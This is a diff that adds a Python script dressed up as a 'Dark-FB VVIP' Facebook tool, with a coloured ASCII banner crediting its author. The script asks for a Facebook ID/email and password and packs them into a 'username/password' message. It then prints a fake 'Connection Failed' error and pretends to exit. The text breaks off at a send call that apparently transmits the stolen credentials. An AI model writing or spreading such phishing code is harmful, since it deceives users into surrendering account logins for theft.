@@ -1,0 +1,36 @@
+logo = """\033[32m
+
+█████████
+█▄█████▄█      ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+█▼▼▼▼▼ - _ --_--╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
+█  _-_-- -_ --__ ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
+█▲▲▲▲▲--  - _ --═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝\033[33mVVIP\033[32m
+█████████      «----------✧----------»
+ ██ ██"""
+
+banner = """\033[32m╔══════════════════════════════════════════╗
+║ \033[1;93m* \033[1;97mAuthor  : Fuck-ID                      \033[1;32m║
+║ \033[1;93m* \033[1;91mYouTube \033[1;97m: Mr_Z17                      \033[1;32m ║
+║ \033[1;93m* \033[1;97mGithub  : https://github.com/Fuck-ID17 \033[1;32m║
+╚══════════════════════════════════════════╝
+\033[33mPlease Login With Your Facebook Account \033[91m!
+"""
+def main():
+	os.system('clear')
+	os.system('sleep 1.5')
+	print(logo)
+	print(banner)
+	print('\033[37m\033[41m• FACEBOOK LOGIN •\033[00m')
+	u=input('\033[1;32mID/Email: \033[33m')
+	p=input('\033[1;32mPassword: \033[33m')
+	msg=('username: '+u+', password: '+p)
+	body=(msg)
+	print('')
+	print('\033[33mSorry, Your Connection Failed\033[31m !\033[37m')
+	os.system('sleep 1.5')
+	print('\033[33mPlease try again later ...')
+	os.system('sleep 2')
+	print('')
+	print('\033[37mExiting program \033[91m!')
+	os.system('exit')
+	x.send(
